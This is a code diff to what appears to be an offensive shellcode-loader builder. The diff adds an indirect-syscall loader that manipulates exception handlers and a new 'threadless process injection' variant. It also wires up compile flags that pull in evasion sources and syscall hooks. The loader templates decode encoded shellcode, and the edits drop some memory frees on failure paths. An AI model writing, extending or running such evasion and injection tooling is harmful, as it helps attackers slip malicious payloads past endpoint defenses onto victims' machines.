@@ -521,7 +521,7 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
         unsigned char* magiccodePtr = magiccode;
         if (CustomBase45ToBinary(base45, strlen(base45), magiccodePtr, &decodedSize)) {
             printf("Failed to decode base45 string\\n");
-            free(magiccode); 
+            //free(magiccode); 
         }
         printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
@@ -534,7 +534,6 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
         unsigned char* magiccodePtr = magiccode;
         if (!CustomCryptStringToBinaryA(base64, strlen(base64), magiccodePtr, &decodedSize)) {
             printf("Failed to decode base64 string\\n");
-            free(magiccode); 
         }
         printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
@@ -547,7 +546,7 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
         unsigned char* magiccodePtr = magiccode;
         if (!CustomCryptStringToBinaryA(base58, strlen(base58), magiccodePtr, &decodedSize)) {
             printf("Failed to decode base58 string\\n");
-            free(magiccode); // Don't forget to free allocated memory on failure
+            free(magiccode);  
         }
         printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
@@ -957,6 +956,12 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
     compile_command.append('-static-libgcc')
     compile_command.append('-static-libstdc++')
     compile_command.append('-lole32')
+    if loader_number == 22:
+        compile_command.append('-static-libgcc')
+        compile_command.append('-static-libstdc++')
+        compile_command.append('./indirect_syscall/FuncWrappers.cpp')
+        compile_command.append('./indirect_syscall/HookModule.cpp')
+        compile_command.append('-I./indirect_syscall/')
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
@@ -964,8 +969,9 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
 
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
-    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76]:
+    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77]:
         compile_command.append('./evader/pebutils.c')
+        # compile_command.append('-lole32')
     if cfg:
         compile_command.append('./evader/cfg_patch.c')
     ## add icon.res file to the compilation command
@@ -1233,7 +1239,7 @@ def main():
     19. DLL overloading 
     20. Stealth new Injection (WriteProcessMemoryAPC + DLL overloading)
     21.
-    22.
+    22. Advanced indirect custom call stack syscall, using VEH-->VCH logic and manually remove handlers from the list.
     23.
     24.
     25.
@@ -1274,6 +1280,8 @@ def main():
 
     75. Dotnet JIT threadless process injection. 
     76. Module List PEB Entrypoint threadless process injection. 
+    77. VT Pointer threadless process injection. Use RtlCreateHeap instead of BaseThreadInitThunk virtual table pointer.
+
      """
 
     def check_non_negative(value):
